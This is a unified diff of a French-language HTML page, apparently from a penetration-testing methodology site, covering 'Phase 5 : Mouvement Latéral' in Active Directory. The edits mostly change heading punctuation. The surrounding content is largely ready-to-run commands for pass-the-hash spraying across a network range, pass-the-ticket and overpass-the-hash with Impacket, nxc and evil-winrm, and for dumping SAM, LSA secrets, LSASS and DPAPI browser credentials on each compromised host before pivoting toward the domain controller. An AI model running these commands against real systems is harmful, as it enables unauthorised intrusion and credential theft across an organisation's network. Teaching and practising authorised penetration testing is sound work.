@@ -841,12 +841,12 @@
   <a href="#51-pass-the-hash-pth" class="md-nav__link">
     <span class="md-ellipsis">
       
-        5.1 — Pass-the-Hash (PtH)
+        5.1 : Pass-the-Hash (PtH)
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="5.1 — Pass-the-Hash (PtH)">
+    <nav class="md-nav" aria-label="5.1 : Pass-the-Hash (PtH)">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -897,7 +897,7 @@
   <a href="#avec-evil-winrm-winrm-port-5985" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Avec evil-winrm (WinRM — port 5985)
+        Avec evil-winrm (WinRM : port 5985)
       
     </span>
   </a>
@@ -924,7 +924,7 @@
   <a href="#52-pass-the-ticket-ptt" class="md-nav__link">
     <span class="md-ellipsis">
       
-        5.2 — Pass-the-Ticket (PtT)
+        5.2 : Pass-the-Ticket (PtT)
       
     </span>
   </a>
@@ -935,7 +935,7 @@
   <a href="#53-overpass-the-hash-opth" class="md-nav__link">
     <span class="md-ellipsis">
       
-        5.3 — Overpass-the-Hash (OPtH)
+        5.3 : Overpass-the-Hash (OPtH)
       
     </span>
   </a>
@@ -946,12 +946,12 @@
   <a href="#54-actions-systematiques-sur-chaque-machine-compromise" class="md-nav__link">
     <span class="md-ellipsis">
       
-        5.4 — Actions systématiques sur chaque machine compromise
+        5.4 : Actions systématiques sur chaque machine compromise
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="5.4 — Actions systématiques sur chaque machine compromise">
+    <nav class="md-nav" aria-label="5.4 : Actions systématiques sur chaque machine compromise">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -974,12 +974,12 @@
   <a href="#55-strategie-de-pivot" class="md-nav__link">
     <span class="md-ellipsis">
       
-        5.5 — Stratégie de pivot
+        5.5 : Stratégie de pivot
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="5.5 — Stratégie de pivot">
+    <nav class="md-nav" aria-label="5.5 : Stratégie de pivot">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -1002,7 +1002,7 @@
   <a href="#56-conversion-de-formats-de-tickets" class="md-nav__link">
     <span class="md-ellipsis">
       
-        5.6 — Conversion de formats de tickets
+        5.6 : Conversion de formats de tickets
       
     </span>
   </a>
@@ -1547,7 +1547,7 @@
   
 
 
-<h1 id="phase-5-mouvement-lateral">Phase 5 — Mouvement Latéral<a class="headerlink" href="#phase-5-mouvement-lateral" title="Permanent link">&para;</a></h1>
+<h1 id="phase-5-mouvement-lateral">Phase 5 : Mouvement Latéral<a class="headerlink" href="#phase-5-mouvement-lateral" title="Permanent link">&para;</a></h1>
 <blockquote>
 <p><strong>Objectif :</strong> Se déplacer de machine en machine pour trouver des credentials supplémentaires, des sessions admin, et progresser vers le DC.</p>
 <p><strong>Règle :</strong> Sur <strong>chaque machine compromise</strong>, dumper les credentials (SAM, LSA, LSASS) et chercher les sessions actives.</p>
@@ -1600,8 +1600,12 @@
 </tr>
 </tbody>
 </table>
+<div class="admonition tip">
+<p class="admonition-title">Référence Impacket</p>
+<p>Tous les outils de cette phase (<code>psexec.py</code>, <code>wmiexec.py</code>, <code>smbexec.py</code>, <code>secretsdump.py</code>, <code>getTGT.py</code>) font partie d'Impacket. Référence complète : <a href="../../outils/impacket/">Impacket</a></p>
+</div>
 <hr />
-<h2 id="51-pass-the-hash-pth">5.1 — Pass-the-Hash (PtH)<a class="headerlink" href="#51-pass-the-hash-pth" title="Permanent link">&para;</a></h2>
+<h2 id="51-pass-the-hash-pth">5.1 : Pass-the-Hash (PtH)<a class="headerlink" href="#51-pass-the-hash-pth" title="Permanent link">&para;</a></h2>
 <h3 id="avec-nxc-spray-sur-tout-le-reseau">Avec nxc (spray sur tout le réseau)<a class="headerlink" href="#avec-nxc-spray-sur-tout-le-reseau" title="Permanent link">&para;</a></h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Tester le hash sur tout le réseau (chercher (Pwn3d!))</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NT_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
@@ -1630,7 +1634,7 @@
 <h3 id="avec-smbexec">Avec smbexec<a class="headerlink" href="#avec-smbexec" title="Permanent link">&para;</a></h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>smbexec.py<span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NT_HASH</span><span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET</span>
 </span></code></pre></div>
-<h3 id="avec-evil-winrm-winrm-port-5985">Avec evil-winrm (WinRM — port 5985)<a class="headerlink" href="#avec-evil-winrm-winrm-port-5985" title="Permanent link">&para;</a></h3>
+<h3 id="avec-evil-winrm-winrm-port-5985">Avec evil-winrm (WinRM : port 5985)<a class="headerlink" href="#avec-evil-winrm-winrm-port-5985" title="Permanent link">&para;</a></h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Connexion interactive</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NT_HASH</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
@@ -1643,7 +1647,7 @@
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>smbclient<span class="w"> </span>//<span class="nv">$TARGET</span>/C$<span class="w"> </span>-U<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span><span class="w"> </span>--pw-nt-hash<span class="w"> </span>--password<span class="o">=</span><span class="nv">$NT_HASH</span>
 </span></code></pre></div>
 <hr />
-<h2 id="52-pass-the-ticket-ptt">5.2 — Pass-the-Ticket (PtT)<a class="headerlink" href="#52-pass-the-ticket-ptt" title="Permanent link">&para;</a></h2>
+<h2 id="52-pass-the-ticket-ptt">5.2 : Pass-the-Ticket (PtT)<a class="headerlink" href="#52-pass-the-ticket-ptt" title="Permanent link">&para;</a></h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Obtenir un TGT (avec mdp ou hash)</span>
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>getTGT.py<span class="w"> </span><span class="nv">$DOMAIN_FQDN</span>/<span class="nv">$USER</span>:<span class="nv">$PWD</span>
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>getTGT.py<span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NT_HASH</span><span class="w"> </span><span class="nv">$DOMAIN_FQDN</span>/<span class="nv">$USER</span>
@@ -1661,14 +1665,14 @@
 </span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_FQDN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>--use-kcache<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
 </span></code></pre></div>
 <hr />
-<h2 id="53-overpass-the-hash-opth">5.3 — Overpass-the-Hash (OPtH)<a class="headerlink" href="#53-overpass-the-hash-opth" title="Permanent link">&para;</a></h2>
+<h2 id="53-overpass-the-hash-opth">5.3 : Overpass-the-Hash (OPtH)<a class="headerlink" href="#53-overpass-the-hash-opth" title="Permanent link">&para;</a></h2>
 <p>Convertir un NT hash en TGT Kerberos pour contourner les filtres NTLM.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>getTGT.py<span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NT_HASH</span><span class="w"> </span><span class="nv">$DOMAIN_FQDN</span>/<span class="nv">$USER</span>
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/<span class="nv">$USER</span>.ccache
 </span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>psexec.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>@<span class="nv">$TARGET_FQDN</span>
 </span></code></pre></div>
 <hr />
-<h2 id="54-actions-systematiques-sur-chaque-machine-compromise">5.4 — Actions systématiques sur chaque machine compromise<a class="headerlink" href="#54-actions-systematiques-sur-chaque-machine-compromise" title="Permanent link">&para;</a></h2>
+<h2 id="54-actions-systematiques-sur-chaque-machine-compromise">5.4 : Actions systématiques sur chaque machine compromise<a class="headerlink" href="#54-actions-systematiques-sur-chaque-machine-compromise" title="Permanent link">&para;</a></h2>
 <h3 id="a-faire-sur-chaque-machine-ou-on-a-un-acces">À faire sur CHAQUE machine où on a un accès<a class="headerlink" href="#a-faire-sur-chaque-machine-ou-on-a-un-acces" title="Permanent link">&para;</a></h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># 1. Identifier les droits</span>
 </span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NT_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;whoami /all&#39;</span>
@@ -1681,7 +1685,7 @@
 </span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="c1"># 3. Dumper les LSA secrets (comptes de service, tâches planifiées)</span>
 </span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NT_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--lsa
 </span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>
-</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="c1"># 4. Dumper LSASS (sessions actives — peut donner mdp en clair si WDigest)</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="c1"># 4. Dumper LSASS (sessions actives : peut donner mdp en clair si WDigest)</span>
 </span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NT_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>lsassy
 </span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>
 </span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="c1"># 5. DPAPI (credentials Chrome, Windows Credential Manager)</span>
@@ -1691,7 +1695,7 @@
 </span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NT_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>spider_plus
 </span></code></pre></div>
 <hr />
-<h2 id="55-strategie-de-pivot">5.5 — Stratégie de pivot<a class="headerlink" href="#55-strategie-de-pivot" title="Permanent link">&para;</a></h2>
+<h2 id="55-strategie-de-pivot">5.5 : Stratégie de pivot<a class="headerlink" href="#55-strategie-de-pivot" title="Permanent link">&para;</a></h2>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Machine 1 (accès initial)
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>    ↓ dump SAM → nouveau hash local
 </span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    ↓ dump LSASS → credentials en mémoire
@@ -1711,7 +1715,7 @@
 </span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$NEW_USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NEW_HASH</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
 </span></code></pre></div>
 <hr />
-<h2 id="56-conversion-de-formats-de-tickets">5.6 — Conversion de formats de tickets<a class="headerlink" href="#56-conversion-de-formats-de-tickets" title="Permanent link">&para;</a></h2>
+<h2 id="56-conversion-de-formats-de-tickets">5.6 : Conversion de formats de tickets<a class="headerlink" href="#56-conversion-de-formats-de-tickets" title="Permanent link">&para;</a></h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># ccache → kirbi (pour Mimikatz/Rubeus sur Windows)</span>
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>ticketConverter.py<span class="w"> </span>ticket.ccache<span class="w"> </span>ticket.kirbi
 </span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
@@ -1727,7 +1731,7 @@
 <li>[ ] LSA secrets dumpés</li>
 <li>[ ] LSASS dumpé (sessions actives)</li>
 <li>[ ] Chaque nouveau credential testé sur tout le réseau</li>
-<li>[ ] Admin sur le DC → <a href="../06-compromission/">Phase 6 — Compromission Totale</a></li>
+<li>[ ] Admin sur le DC → <a href="../06-compromission/">Phase 6 : Compromission Totale</a></li>
 </ul>
 
 
